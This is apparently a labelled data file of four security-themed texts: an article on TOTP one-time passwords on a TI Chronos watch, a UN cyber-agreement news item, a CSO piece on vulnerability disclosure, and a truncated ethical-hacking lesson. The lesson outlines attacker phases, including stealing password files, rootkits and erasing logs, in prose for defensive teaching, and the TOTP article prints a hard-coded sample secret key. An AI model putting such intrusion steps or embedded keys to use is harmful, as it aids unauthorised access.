{"text": "Passwords establish the identity of a user, and they are an essential component of modern information technology. In this article, I describe one-time passwords: passwords that you use once and then never again. Because they’re used only once, you don’t have to remember them. I describe how to implement one-time passwords with a Texas Instruments (TI) eZ430-Chronos wireless development tool in a watch and how to use them to log in to existing web services such as Google Gmail (see Photo 1).\nPhoto 1—The Texas Instruments eZ430 Chronos watch displays a unique code that enables logging into Google Gmail. The code is derived from the current time and a secret value embedded in the watch.\nTo help me get around on the Internet, I use a list of about 80 passwords (at the latest count). Almost any online service I use requires a password: reading e-mail, banking, shopping, checking reservations, and so on. Many of these Internet-based services have Draconian password rules. For example, some sites require a password of at least eight characters with at least two capitals or numbers and two punctuation characters. The sheer number of passwords, and their complexity, makes it impossible to remember all of them.\nWhat are the alternatives? There are three different ways of verifying the identity of a remote user. The most prevailing one, the password, tests something that a user knows. A second method tests something that the user has, such as a secure token. Finally, we can make use of biometrics, testing a unique user property, such as a fingerprint or an eye iris pattern.\nEach of these three methods comes with advantages and disadvantages. The first method (passwords) is inexpensive, but it relies on the user’s memory. The second method (secure token) replaces the password with a small amount of embedded hardware. To help the user to log on, the token provides a unique code. Since it’s possible for a secure token to get lost, it must be possible to revoke the token. The third method (biometrics) requires the user to enroll a biometric, such as a fingerprint. Upon login, the user’s fingerprint is measured again and tested against the enrolled fingerprint. The enrollment has potential privacy issues. And, unlike a secure token, it’s not possible to revoke something that is biometric.\nThe one-time password design in this article belongs to the second category. A compelling motivation for this choice is that a standard, open proposal for one-time passwords is available. The Initiative for Open Authentication (OATH) is an industry consortium that works on a universal authentication mechanism for Internet users. They have developed several proposals for user authentication methods, and they have submitted these to the Internet Engineering Task Force (IETF). I’ll be relying on these proposals to demonstrate one-time passwords using a eZ430-Chronos watch. The eZ430-Chronos watch, which I’ll be using as a secure token, is a wearable embedded development platform with a 16-bit Texas Instruments MSP430 microcontroller.\nONE-TIME PASSWORD LOGON\nFigure 1 demonstrates how one-time passwords work. Let’s assume a user—let’s call him Frank—is about to log on to a server. Frank will generate a one-time password using two pieces of information: a secret value unique to Frank and a counter value that increments after each authentication. The secret, as well as the counter, is stored in a secure token. To transform the counter and the secret into a one-time password, a cryptographic hash algorithm is used. Meanwhile, the server will generate the one-time password it is expecting to see from Frank. The server has a user table that keeps track of Frank’s secret and his counter value. When both the server and Frank obtain the same output, the server will authenticate Frank. Because Frank will use each password only once, it’s not a problem if an attacker intercepts the communication between Frank and the server.\nFigure 1—A one-time password is formed by passing the value of a personal secret and a counter through a cryptographic hash (1). The server obtains Frank’s secret and counter value from a user table and generates the same one-time password (2). The two passwords must match to authenticate Frank (3). After each authentication, Frank’s counter is incremented, ensuring a different password the next time (4).\nAfter each logon attempt, Frank will update his copy of the counter in the secure token. The server, however, will only update Frank’s counter in the user table when the logon was successful. This will intercept false logon attempts. Of course, it is possible that Frank’s counter value in the secure token gets out of sync with Frank’s counter value in the server. To adjust for that possibility, the server will use a synchronization algorithm. The server will attempt a window of counter values before rejecting Frank’s logon. The window chosen should be small (i.e., five). It should only cover for the occasional failed logon performed by Frank. As an alternate mechanism to counter synchronization, Frank could also send the value of his counter directly to the server. This is safe because of the properties of a cryptographic hash: the secret value cannot be computed from the one-time password, even if one knows the counter value.\nYou see that, similar to the classic password, the one-time password scheme still relies on a shared secret between Frank and the server. However, the shared secret is not communicated directly from the user to the server, it is only tested indirectly through the use of a cryptographic hash. The security of a one-time password therefore stands or falls with the security of the cryptographic hash, so it’s worthwhile to look further into this operation.\nA cryptographic hash is a one-way function that calculates a fixed-length output, called the digest, from an arbitrary-length input, called the message. The one-way property means that, given the message, it’s easy to calculate the digest. But, given the digest, one cannot find back the message.\nThe one-way property of a good cryptographic hash implies that no information is leaked from the message into the digest. For example, a small change in the input message may cause a large and seemingly random change in the digest. For the one-time password system, this property is important. It ensures that each one-time password will look very different from one authentication to the next.\nThe one-time password algorithm makes use of the SHA-1 cryptographic hash algorithm. This algorithm produces a digest of 160 bits. By today’s Internet standards, SHA-1 is considered old. It was developed by Ronald L. Rivest and published as a standard in 1995.\nIs SHA-1 still adequate to create one-time passwords? Let’s consider the problem that an attacker must solve to break the one-time password system. Assume an attacker knows the SHA-1 digest of Frank’s last logon attempt. The attacker could now try to find a message that matches the observed digest. Indeed, knowing the message implies knowing a value of Frank’s secret and the counter. Such an attack is called a pre-image attack.\nFortunately, for SHA-1, there are no known (published) pre-image attacks that are more efficient than brute force trying all possible messages. It’s easy to see that this requires an astronomical number of messages values. For a 160-bit digest, the attacker can expect to test on the order of 2160 messages. Therefore it’s reasonable to conclude that SHA-1 is adequate for the one-time password algorithm. Note, however, that this does not imply that SHA-1 is adequate for any application. In another attack model, cryptographers worry about collisions, the possibility of an attacker finding a pair of messages that generate the same digest. For such attacks on SHA-1, significant progress has been made in recent years.\nThe one-time password scheme in Figure 1 combines two inputs into a single digest: a secret key and a counter value. To combine a static, secret key with a variable message, cryptographers use a keyed hash. The digest of a keyed hash is called a message authentication code (MAC). It can be used to verify the identity of the message sender.\nFigure 2 shows how SHA-1 is used in a hash-based message authentication code (HMAC) construction. SHA-1 is applied twice. The first SHA-1 input is a combination of the secret key and the input message. The resulting digest is combined again with the secret key, and SHA-1 is then used to compute the final MAC. Each time, the secret key is mapped into a block of 512 bits. The first time, it is XORed with a constant array of 64 copies of the value 0×36. The second time, it is XORed with a constant array of 64 copies of the value 0x5C.\nFigure 2—The SHA-1 algorithm on the left is a one-way function that transforms an arbitrary-length message into a 160-bit fixed digest. The Hash-based message authentication code (HMAC) on the right uses SHA-1 to combine a secret value with an arbitrary-length message to produce a 160-bit message authentication code (MAC).\nTHE HOTP ALGORITHM\nWith the HMAC construction, the one-time password algorithm can now be implemented. In fact, the HMAC can almost be used as is. The problem with using the MAC itself as the one-time password is that it contains too many bits. The secure token used by Frank does not directly communicate with the server. Rather, it shows a one-time password Frank needs to type in. A 160-bit number requires 48 decimal digits, which is far too long for a human.\nOATH has proposed the Hash-based one-time password (HOTP) algorithm. HOTP uses a key (K) and a counter (C). The output of HOTP is a six-digit, one-time password called the HOTP value. It is obtained as follows. First, compute a 160-bit HMAC value using K and C. Store this result in an array of 20 bytes, hmac, such that hmac contains the 8 leftmost bits of the 160-bit HMAC string and hmac contains the 8 rightmost bits. The HOTP value is then computed with a snippet of C code (see Listing 1).\nListing 1—C code used to compute the HTOP value\nThere is now an algorithm that will compute a six-digit code starting from a K value and a C value. HOTP is described in IETF RFC 4226. A typical HOTP implementation would use a 32-bit C and an 80-bit K.\nAn interesting variant of HOTP, which I will be using in my implementation, is the time-based one-time password (TOTP) algorithm. The TOTP value is computed in the same way as the HOTP value. However, the C is replaced with a timestamp value. Rather than synchronizing a C between the secure token and the server, TOTP simply relies on the time, which is the same for the server and the token. Of course, this requires the secure token to have access to a stable and synchronized time source, but for a watch, this is a requirement that is easily met.\nThe timestamp value chosen for TOTP is the current Unix time, divided by a factor d. The current Unix time is the number of seconds that have elapsed since midnight January 1, 1970, Coordinated Universal Time. The factor d compensates for small synchronization differences between the server and the token. For example, a value of 30 will enable a 30-s window for each one-time password. The 30-s window also gives a user sufficient time to type in the one-time password before it expires.\nIMPLEMENTATION IN THE eZ430-CHRONOS WATCH\nI implemented the TOTP algorithm on the eZ430-Chronos watch. This watch contains a CC430F6137 microcontroller, which has 32 KB of flash memory for programs and 4,096 bytes of RAM for data. The watch comes with a set of software applications to demonstrate its capabilities. Software for the watch can be written in C using TI’s Code Composer Studio (CCStudio) or in IAR Systems’s IAR Embedded Workbench.\nThe software for the eZ430-Chronos watch is structured as an event-driven system that ties activities performed by software to events such as alarms and button presses. In addition, the overall operation of the watch is driven through several modes, corresponding to a particular function executed on the watch. These modes are driven through a menu system.\nPhoto 2 shows the watch with its 96-segment liquid crystal display (LCD) and four buttons to control its operation. The left buttons select the mode. The watch has two independent menu systems, one to control the top line of the display and one to control the bottom line. Hence, the overall mode of the watch is determined by a combination of a menu-1 entry and a menu-2 entry.\nPhoto 2—With the watch in TOTP mode, one-time passwords are shown on the second line of the display. In this photo, I am using the one-time password 854410. The watch display cycles through the strings “totP,” “854,” and “410.”\nListing 2 illustrates the code relevant to the TOTP implementation. When the watch is in TOTP mode, the sx button is tied to the function set_totp(). This function initializes the TOTP timestamp value.\nListing 2—Code relevant to the TOTP implementation\nThe function retrieves the current time from the watch and converts it into elapsed seconds using the standard library function mktime. Two adjustments are made to the output of mktime, on line 11 and line 12. The first factor, 2208988800, takes into account that the mktime in the TI library returns the number of seconds since January 1, 1900, while the TOTP standard sets zero time at January 1, 1970. The second factor, 18000, takes into account that my watch is set to Eastern Standard Time (EST), while the TOTP standard assumes the UTC time zone—five hours ahead of EST. Finally, on line 14, the number of seconds is divided by 30 to obtain the standard TOTP timestamp. The TOTP timestamp is further updated every 30 s, through the function tick_totp().\nThe one-time password is calculated by compute_totp on line 33. Rather than writing a SHA1-HMAC from scratch, I ported the open-source implementation from Google Authenticator to the TI MSP 430. Lines 39 through 50 show how a six-digit TOTP code is calculated from the 160-bit digest output of the SHA1-HMAC.\nThe display menu function is display_totp on line 52. The function is called when the watch first enters TOTP mode and every second after that. First, the watch will recompute the one-time password code at the start of each 30-s interval. Next, the TOTP code is displayed. The six digits of the TOTP code are more than can be shown on the bottom line of the watch. Therefore, the watch will cycle between showing “totP,” the first three digits of the one-time password, and the next three digits of the one-time password. The transitions each take 1 s, which is sufficient for a user to read all digits.\nThere is one element missing to display TOTP codes: I did not explain how the unique secret value is loaded into the watch. I use Google Authenticator to generate this secret value and to maintain a copy of it on Google’s servers so that I can use it to log on with TOTP.\nLOGGING ONTO GMAIL\nGoogle Authenticator is an implementation of TOTP developed by Google. It provides an implementation for Android, Blackberry, and IOS so you can use a smartphone as a secure token. In addition, it also enables you to extend your login procedure with a one-time password. You cannot replace your standard password with a one-time password, but you can enable both at the same time. Such a solution is called a two-factor authentication procedure. You need to provide a password and a one-time password to complete the login.\nAs part of setting up the two-factor authentication with Google (through Account Settings – Using Two-Step Verification), you will receive a secret key. The secret key is presented as a 16-character string made up of a 32-character alphabet. The alphabet consists of the letters A through Z and the digits 2, 3, 4, 5, 6, and 7. This clever choice avoids numbers that can confused with letters (8 and B, for example). The 16-character string thus represents an 80-bit key.\nI program this string in the TOTP design for the eZ430-Chronos watch to initialize the secret. In the current implementation, the key is loaded in the function reset_totp().\nbase32_decode((const u8 *)\n”4RGXVQI7YVY4LBPC”, stotp.key, 16);\nOf course, entering the key as a constant string in the firmware is an obvious vulnerability. An attacker who has access to a copy of the firmware also has the secret key used by the TOTP implementation! It’s possible to protect or obfuscate the key from the watch firmware, but these techniques are beyond the scope of this article. Once the key is programmed into the watch and the time is correctly set, you can display TOTP codes that help you complete the logon process of Google. Photo 1 shows a demonstration of logging onto Google’s two-step verification with a one-time password.\nOTHER USES OF TOTP\nThere are other possibilities for one-time passwords. If you are using Linux as your host PC, you can install the OATH Toolkit, which implements the HOTP and TOTP mechanisms for logon. This toolkit enables you to install authentication modules on your PC that can replace the normal login passwords. This enables you to effectively replace the password you need to remember with a password generated from your watch.\nIncidentally, several recent articles—which I have included in the resources section of this article—point to the limits of conventional passwords. New technologies, including one-time passwords and biometrics, provide an interesting alternative. With standards such as those from OATH around the corner, the future may become more secure and user-friendly at the same time.\n[Editor's note: This article originally appeared in Circuit Cellar 262, May 2012.]\nPatrick Schaumont writes the Embedded Security column for Circuit Cellar magazine. He is an Associate Professor in the Bradley Department of Electrical and Computer Engineering at Virginia Tech. Patrick works with his students on research projects in embedded security, covering hardware, firmware, and software.\nTo download the code, go to ftp://ftp.circuitcellar.com/pub/Circuit_Cellar/2012/262.\nGoogle Authenticator, http://code.google.com/p/google-authenticator.\nInitiative for Open Authentication (OATH), www.openauthentication.org.\nInternet Engineering Task Force (IETF), www.ietf.org.\nD. M’Raihi, et al, “TOTP: Time-Based One-Time Password Algorithm,” IETF RFC 6238, 2011.\n—, “HOTP: An HMAC-Based One-Time Password Algorithm,” IETF RFC 4226, 2005.\nOATH Toolkit, www.nongnu.org/oath-toolkit.\nK. Schaffer, “Are Password Requirements Too Difficult?,” IEEE Computer Magazine, 2011.\nS. Sengupta, “Logging in With a Touch or a Phrase (Anything but a Password),” New York Times, 2011.\nIAR Embedded Workbench – IAR Systems\neZ430-Chronos Wireless development system and Code Composer Studio (CCStudio) IDE – Texas Instruments, Inc.", "label": 1}
{"text": "The US, UK, China and Russia are among 15 nations that have agreed to work together to reduce the threat of cyber attacks.\nThe agreement, signed at the UN, represents a significant change in US posture, said Robert Knake, a cyberwarfare expert with the Council on Foreign Relations.\nParticipation of the US demonstrates the Obama administration's strategy of diplomatic engagement, he said.\nThe group has recommended the UN creates norms of accepted behaviour in cyberspace. It should also exchange information on national legislation and cybersecurity strategies, and strengthen the capacity of less-developed countries to protect their computer systems.\nWhen the group last met in 2005, they failed to find common ground. This time, by crafting a short text that left out controversial elements, they were able to reach a consensus.\nIn the past, US efforts to work with other countries in cyberspace have centred on combatting crimes online, but did not deal with issues such as state involvement in or responsibility for cyber intrusions into critical computer systems.\nOthers in the group are France, Germany, Estonia, Belarus, Brazil, India, Israel, Italy, Qatar, South Korea, and South Africa.", "label": 1}
{"text": "Software Vulnerability Disclosure: The Chilling Effect\nHow the Web makes creating software vulnerabilities easier, disclosing them more difficult and discovering them possibly illegal\nJanuary 01, 2007 — CSO —\nLast February at Purdue University, a student taking \"cs390s—Secure Computing\" told his professor, Dr. Pascal Meunier, that a Web application he used for his physics class seemed to contain a serious vulnerability that made the app highly insecure. Such a discovery didn't surprise Meunier. \"It's a secure computing class; naturally students want to discover vulnerabilities.\"\nThey probably want to impress their prof, too, who's a fixture in the vulnerability discovery and disclosure world. Dr. Meunier has created software that interfaces with vulnerability databases. He created ReAssure, a kind of vulnerability playground, a safe computing space to test exploits and perform what Meunier calls \"logically destructive experiments.\" He sits on the board of editors for the Common Vulnerabilities and Exposures (CVE) service, the definitive dictionary of all confirmed software bugs. And he has managed the Vulnerabilities Database and Incident Response Database projects at Purdue's Center for Education and Research in Information and Assurance, or Cerias, an acronym pronounced like the adjective that means \"no joke.\"\nWhen the undergraduate approached Meunier, the professor sensed an educational opportunity and didn't hesitate to get involved. \"We wanted to be good citizens and help prevent the exploit from being used,\" he says. In the context of vulnerable software, it would be the last time Meunier decided to be a good citizen.\nMeunier notified the authors of the physics department application that one of his students—he didn't say which one—had found a suspected flaw, \"and their response was beautiful,\" says Meunier. They found, verified and fixed the bug right away, no questions asked.\nBut two months later, in April, the same physics department website was hacked. A detective approached Meunier, whose name was mentioned by the staff of the vulnerable website during questioning. The detective asked Meunier for the name of the student who had discovered the February vulnerability. The self-described \"stubborn idealist\" Meunier refused to name the student. He didn't believe it was in that student's character to hack the site and, furthermore, he didn't believe the vulnerability the student had discovered, which had been fixed, was even connected to the April hack.\nThe detective pushed him. Meunier recalls in his blog: \"I was quickly threatened with the possibility of court orders, and the number of felony counts in the incident was brandished as justification for revealing the name of the student.\" Meunier's stomach knotted when some of his superiors sided with the detective and asked him to turn over the student. Meunier asked himself: \"Was this worth losing my job? Was this worth the hassle of responding to court orders, subpoenas, and possibly having my computers (work and personal) seized?\" Later, Meunier recast the downward spiral of emotions: \"I was miffed, uneasy, disillusioned.\"", "label": 1}
{"text": "Continuation of Ethical Hacking Basics Class part 1\nThe Transmission Control Protocol/Internet Protocol (TCP/IP) suite is so dominant and important to ethical hacking that it is given wide coverage in this lesson. Many tools, attacks, and techniques that will be covered throughout this class are based on the use and misuse of TCP/IP protocol suite. Understanding its basic functions will advance your security skills. This lesson also spends time reviewing the attackerís process and some of the better known methodologies used by ethical hackers.\nState the process or methodology hackers use to attack networks\nAttackers follow a fixed methodology. To beat a hacker, you have to think like one, so itís important to understand the methodology. The steps a hacker follows can be broadly divided into six phases, which include pre-attack and attack phases:\n- Performing Reconnaissance\n- Scanning and enumeration\n- Gaining access\n- Escalation of privilege\n- Maintaining access\n- Covering tracks and placing backdoors\nA denial of service (DoS) might be included in the preceding steps if the attacker has no success in gaining access to the targeted system or network. Letís look at each of these phases in more detail so that you better understand the steps.\nReconnaissance is considered the first pre-attack phase and is a systematic attempt to locate, gather, identify, and record information about the target. The hacker seeks to find out as much information as possible about the victim. This first step is considered a passive information gathering. As an example, many of you have probably seen a detective movie in which the policeman waits outside a suspectís house all night and then follows him from a distance when he leaves in the car. Thatís reconnaissance; it is passive in nature, and, if done correctly, the victim never even knows it is occurring.\nHackers can gather information in many different ways, and the information they obtain allows them to formulate a plan of attack. Some hackers might dumpster dive to find out more about the victim. Dumpster diving is the act of going through the victimís trash. If the organization does not have good media control policies, many types of sensitive information will probably go directly in the trash. Organizations should inform employees to shred sensitive information or dispose of it in an approved way.\nDonít think that you are secure if you take adequate precautions with paper documents. Another favorite of the hacker is social engineering. A social engineer is a person who can smooth talk other individuals into revealing sensitive information. This might be accomplished by calling the help desk and asking someone to reset a password or by sending an email to an insider telling him he needs to reset an account.\nIf the hacker is still struggling for information, he can turn to what many consider the hackerís most valuable reconnaissance tool, the Internet. Thatís right; the Internet offers the hacker a multitude of possibilities for gathering information. Letís start with the company website. The company website might have key employees listed, technologies used, job listings probably detailing software and hardware types used, and some sites even have databases with employee names and email addresses.\nScanning and enumeration is considered the second pre-attack phase. Scanning is the active step of attempting to connect to systems to elicit a response. Enumeration is used to gather more in-depth information about the target, such as open shares and user account information. At this step in the methodology, the hacker is moving from passive information gathering to active information gathering. Hackers begin injecting packets into the network and might start using scanning tools such as Nmap. The goal is to map open ports and applications. The hacker might use techniques to lessen the chance that he will be detected by scanning at a very slow rate. As an example, instead of checking for all potential applications in just a few minutes, the scan might take days to verify what applications are running. Many organizations use intrusion detection systems(IDS) to detect just this type of activity. Donít think that the hacker will be content with just mapping open ports. He will soon turn his attention to grabbing banners. He will want to get a good idea of what type of version of software applications you are running. And, he will keep a sharp eye out for down-level software and applications that have known vulnerabilities. An example of down-level software would be Windows 95.\nOne key defense against the hacker is the practice of deny all. The practice of the deny all rule can help reduce the effectiveness of the hackerís activities at this step. Deny all means that all ports and applications are turned off, and only the minimum number of applications and services are turned on that are needed to accomplish the organizationís goals.\nUnlike the elite black hat hacker who attempts to remain stealth, script kiddies might even use vulnerability scanners such as Nessus to scan a victimís network. Although the activities of the black hat hacker can be seen as a single shot in the night, the script kiddies scan will appear as a series of shotgun blasts, as their activity will be loud and detectable. Programs such as Nessus are designed to find vulnerabilities but are not designed to be a hacking tool; as such, they generate a large amount of detectable network traffic.\nThe greatest disadvantage of vulnerability scanners is that they are very noisy.\nAs far as potential damage, this could be considered one of the most important steps of an attack. This phase of the attack occurs when the hacker moves from simply probing the network to actually attacking it. After the hacker has gained access, he can begin to move from system to system, spreading his damage as he progresses.\nAccess can be achieved in many different ways. A hacker might find an open wireless access point that allows him a direct connection or the help desk might have given him the phone number for a modem used for out-of-band management. Access could be gained by finding a vulnerability in the web serverís software. If the hacker is really bold, he might even walk in and tell the receptionist that he is late for a meeting and will wait in the conference room with network access. Pity the poor receptionist who unknowingly provided network access to a malicious hacker. These things do happen to the company that has failed to establish good security practices and procedures.\nThe factors that determine the method a hacker uses to access the network ultimately comes down to his skill level, amount of access he achieves, network architecture, and configuration of the victimís network.\nAlthough the hacker is probably happy that he has access, donít expect him to stop what he is doing with only a ďJoe userĒ account. Just having the access of an average user probably wonít give him much control or access to the network. Therefore, the attacker will attempt to escalate himself to administrator or root privilege. After all, these are the individuals who control the network, and that is the type of power the hacker seeks.\nPrivilege escalation can best be described as the act of leveraging a bug or vulnerability in an application or operating system to gain access to resources that normally would have been protected from an average user. The end result of privilege escalation is that the application performs actions that are running within a higher security context than intended by the designer, and the hacker is granted full access and control.\nWould you believe that hackers are paranoid people? Well, many are, and they worry that their evil deeds might be uncovered. They are diligent at working on ways to maintain access to the systems they have attacked and compromised. They might attempt to pull down the etc/passwd file or steal other passwords so that they can access other userís accounts.\nRootkits are one option for hackers. A rootkit is a set of tools used to help the attacker maintain his access to the system and use it for malicious purposes. Rootkits have the capability to mask the hacker, hide his presence, and keep his activity secret. They will be discussed in detail later on in the class.\nSometimes hackers might even fix the original problem that they used to gain access, where they can keep the system to themselves. After all, who wants other hackers around to spoil the fun? Sniffers are yet another option for the hacker and can be used to monitor the activity of legitimate users. At this point, hackers are free to upload, download, or manipulate data as they see fit.\nNothing happens in a void, and that includes computer crime. Hackers are much like other criminals in that they would like to be sure to remove all evidence of their activities. This might include using rootkits or other tools to cover their tracks. Other hackers might hunt down log files and attempt to alter or erase them.\nHackers must also be worried about the files or programs they leave on the compromised system. File hiding techniques, such as hidden directories, hidden attributes, and Alternate Data Streams (ADS), can be used. As an ethical hacker, you will need to be aware of these tools and techniques to discover their activities and to deploy adequate countermeasures.\nBackdoors are methods that the hacker can use to reenter the computer at will. The tools and techniques used to perform such activities are discussed later on in the class. At this point, what is important is to identify the steps.\nAs an ethical hacker, you will follow a similar process to one that an attacker uses. The stages you progress through will map closely to those the hacker uses, but you will work with the permission of the company and will strive to ďdo no harm.Ē By ethical hacking and assessing the organizations strengths and weaknesses, you will perform an important service in helping secure the organization. The ethical hacker plays a key role in the security process. The methodology used to secure an organization can be broken down into five key steps. Ethical hacking is addressed in the first:\nEthical hacking, penetration testing, and hands-on security tests.\n- Policy Development\nDevelopment of policy based on the organizationís goals and mission. The focus should be on the organizationís critical assets.\nThe building of technical, operational, and managerial controls to secure key assets and data.\nEmployees need to be trained as to how to follow policy and how to configure key security controls, such as Intrusion Detection Systems (IDS) and firewalls.\nAuditing involves periodic reviews of the controls that have been put in place to provide good security. Regulations such as Health Insurance Portability and Accountability Act (HIPAA) specify that this should be done yearly.\nAll hacking basically follows the same six-step methodology discussed in the previous section: reconnaissance, scanning and enumeration, gaining access, escalation of privilege, maintaining access, and covering tracks and placing backdoors.\nIs this all you need to know about methodologies? No, different organizations have developed diverse ways to address security testing. There are some basic variations you should be aware of. These include National Institute of Standards and Technology 800-42, Threat and Risk Assessment Working Guide, Operational Critical Threat, Asset, fand Vulnerability Evaluation, and Open Source Security Testing Methodology Manual. Each is discussed next.\nThe NIST 800-42 method of security assessment is broken down into four basic stages that Include:\nNIST has developed many standards and practices for good security. This methodology is contained in NIST 800-42. This is just one of several documents available to help guide you through an assessment. Find out more at http://csrc.nist.gov/publications/nistpubs.\nThe Threat and Risk Assessment Working Guide provides guidance to individuals or teams carrying out a Threat and Risk Assessment (TRA) for an existing or proposed IT system. This document helps provide IT security guidance and helps the user determine which critical assets are most at risk within that system and develop recommendations for safeguards. Find out more at http://www.cse-cst.gc.ca/publication.../itsg04-e.html.\nOCTAVE focuses on organizational risk and strategic, practice-related issues. OCTAVE is driven by operational risk and security practices. OCTAVE is self-directed by a small team of people from the organizationís operational, business units, and the IT department. The goal of OCTAVE is to get departments to work together to address the security needs of the organization. The team uses the experience of existing employees to define security, identify risks, and build a robust security strategy. Find out more at www.cert.org/octave.\nOne well-known open sourced methodology is the OSSTMM. The OSSTMM divides security assessment into six key points known as sections. They are as follows:\n* Physical Security\n* Internet Security\n* Information Security\n* Wireless Security\n* Communications Security\n* Social Engineering\nThe OSSTMM gives metrics and guidelines as to how many man-hours a particular assessment will require. Anyone serious about learning more about security assessment should review this documentation. The OSSTMM outlines what to do before, during, and after a security test. Find out more at www.isecom.org/osstmm.\nTo really understand many of the techniques and tools that hackers use, you need to understand how systems and devices communicate. Hackers understand this, and many think outside the box when planning an attack or developing a hacking tool. As an example, TCP uses flags to communicate, but what if a hacker sends TCP packets with no flags set? Sure, it breaks the rules of the protocol, but it might allow the attacker to illicit a response to help identify the server. As you can see, having the ability to know how a protocol, service, or application works and how it can be manipulated can be beneficial.\nThe OSI model and TCP/IP are discussed in the next sections. Pay careful attention to the function of each layer of the stack, and think about what role each layer plays in the communication process.\nUnderstand the Open Systems Interconnect (OSI) Model\nOnce upon a time, the world of network protocols was much like the Wild West. Everyone kind of did their own thing, and if there were trouble, there would be a shoot-out on Main Street. Trouble was, you never knew whether you were going to get hit by a stray bullet. Luckily, the IT equivalent of the sheriff came to town. This was the International Standards Organization (ISO). The ISO was convinced that there needed to be order and developed the Open Systems Interconnect (OSI) model in 1984. The model is designed to provide order by specifying a specific hierarchy in which each layer builds on the output of each adjacent layer. Although its role as sheriff was not widely accepted by all, the model is still used today as a guide to describe the operation of a networking environment.\nThere are seven layers of the OSI model: the Application, Presentation, Session, Transport, Network, Data Link, and Physical layers. The seven layers of the OSI model are shown in Figure 2.1, which overviews data moving between two systems up and down the stack, and described in the following list:\nLayer 7 is known as the Application layer. Recognized as the top layer of the OSI model, this layer serves as the window for application services. The Application layer is one that most users are familiar with as it is the home of email programs, FTP, Telnet, web browsers, and office productivity suites, as well as many other applications. It is also the home of many malicious programs such as viruses, worms, Trojan horse programs, and other virulent applications.Presentation layer\nLayer 6 is known as the Presentation layer. The Presentation layer is responsible for taking data that has been passed up from lower levels and putting it into a format that Application layer programs can understand. These common formats include American Standard Code for Information Interchange (ASCII), Extended Binary-Coded Decimal Interchange Code (EBCDIC), and American National Standards Institute (ANSI). From a security standpoint, the most critical process handled at this layer is encryption and decryption. If properly implemented, this can help security data in transit.Session layer\nLayer 5 is known as the Session layer. Its functionality is put to use when creating, controlling, or shutting down a TCP session. Items such as the TCP connection establishment and TCP connection occur here. Session-layer protocols include items such as Remote Procedure Call and SQLNet from Oracle. From a security standpoint, the Session layer is vulnerable to attacks such as session hijacking. A session hijack can occur when a legitimate user has his session stolen by a hacker. This will be discussed in detail in lesson 7, \"Sniffers, Session Hijacking, and Denial of Service \".Transport layer\nLayer 4 is known as the Transport layer. The Transport layer ensures completeness by handling end-to-end error recovery and flow control. Transport-layer protocols include TCP, a connection-oriented protocol. TCP provides reliable communication through the use of handshaking, acknowledgments, error detection, and session teardown, as well as User Datagram Protocol (UDP), a connectionless protocol. UDP offers speed and low overhead as its primary advantage. Security concerns at the transport level include Synchronize(SYN) attacks, Denial of Service(DoS), and buffer overflows.Network layer\nLayer 3 is known as the Network layer. This layer is concerned with logical addressing and routing. The Network layer is the home of the Internet Protocol (IP), which makes a best effort at delivery of datagrams from their source to their destination. Security concerns at the network level include route poisoning, DoS, spoofing, and fragmentation attacks. Fragmentation attacks occur when hackers manipulate datagram fragments to overlap in such a way to crash the victimís computer. IPSec is a key security service that is available at this layer.Data Link layer\nLayer 2 is known as the Data Link layer. The Data Link layer is responsible for formatting and organizing the data before sending it to the Physical layer. The Data Link layer organizes the data into frames. A frameis a logical structure in which data can be placed; itís a packet on the wire. When a frame reaches the target device, the Data Link layer is responsible for stripping off the data frame and passing the data packet up to the Network layer. The Data Link layer is made up of two sub layers, including the logical link control layer (LLC) and the media access control layer (MAC). You might be familiar with the MAC layer, as it shares its name with the MAC addressing scheme. These 6-byte (48-bit) addresses are used to uniquely identify each device on the local network. A major security concern of the Data Link layer is the Address Resolution Protocol (ARP) process. ARP is used to resolve known Network layer addresses to unknown MAC addresses. ARP is a trusting protocol and, as such, can be used by hackers for APR poisoning, which can allow them access to traffic on switches they should not have.Physical layer\nLayer 1 is known as the Physical layer. At Layer 1, bit-level communication takes place. The bits have no defined meaning on the wire, but the Physical layer defines how long each bit lasts and how it is transmitted and received. From a security standpoint, you must be concerned anytime a hacker can get physical access. By accessing a physical component of a computer networkósuch as a computer, switch, or cableóthe attacker might be able to use a hardware or software packet snifferto monitor traffic on that network. Sniffers enable attacks to capture and decode packets. If no encryption is being used, a great deal of sensitive information might be directly available to the hacker.TIP\nFor the exam, make sure that you know which attacks and defenses are located on each layer.\nHave a basic knowledge of the Transmission Control Protocol/Internet Protocol (TCP/IP) and their functionality Describe the basic TCP/IP frame structure\nFour main protocols form the core of TCP/IP: the Internet Protocol (IP), the Transmission Control Protocol (TCP), the User Datagram Protocol (UDP), and the Internet Control Message Protocol (ICMP). These protocols are essential components that must be supported by every device that communicates on a TCP/IP network. Each serves a distinct purpose and is worthy of further discussion. The four layers of the TCP/IP stack are shown in Figure 2.2. The figure lists the Application, Host-to-host, Internet, and Network Access layers and describes the function of each.\nTCP/IP is the foundation of all modern networks. In many ways, you can say that TCP/IP has grown up along with the development of the Internet. Its history can be traced back to standards adopted by the U.S. governmentís Department of Defense (DoD) in 1982. Originally, the TCP/IP model was developed as a flexible, fault tolerant set of protocols that were robust enough to avoid failure should one or more nodes go down. After all, the network was designed to these specifications to withstand a nuclear strike, which might destroy key routing nodes. The designers of this original network never envisioned the Internet we use today. Because TCP/IP was designed to work in a trusted environment, many TCP/IP protocols are now considered insecure. As an example, Telnet is designed to mask the password on the userís screen, as the designers didnít want shoulder surfers stealing a password; however, the password is sent in clear text on the wire. Little concern was ever given to the fact that an untrustworthy party might have access to the wire and be able to sniff the clear text password. Most networks today run TCP/IPv4. Many security mechanisms in TCP/IPv4 are add-ons to the original protocol suite. As the layers are stacked one atop another, encapsulation takes place. Encapsulation is the technique of layering protocols in which one layer adds a header to the information from the layer above. An example of this can be seen in Figure 2.3. This screenshot from a sniffer program has UDP highlighted.\nA lot of free packet sniffing utilities are available on the Internet. Consider evaluating Packetyzer for Windows or Ethereal for Linux. There are also many commercial sniffing tools, such as Sniffer by Network General. These tools can help you learn more about encapsulation and packet structure.\nLetís take a look at each of the four layers of TCP/IP and discuss some of the security concerns lassociated with each layer and specific protocols. The four layers of TCP/IP include\n- The Application layer\n- The Host-to-host layer\n- The Internet layer\n- The Network access layer\nDescribe application ports and how they are numbered The Application layer sets at the top of the protocol stack. This layer is responsible for application support. Applications are typically mapped not by name, but by their corresponding port. Ports are placed into TCP and UDP packets so that the correct application can be passed to the required protocols below.\nAlthough a particular service might have an assigned port, nothing specifies that services cannot listen on another port. A common example of this is Simple Mail Transfer Protocol (SMTP). The assigned port of this is 25. Your cable company might block port 25 in an attempt to keep you from running a mail server on your local computer; however, nothing prevents you from running your mail server on another local 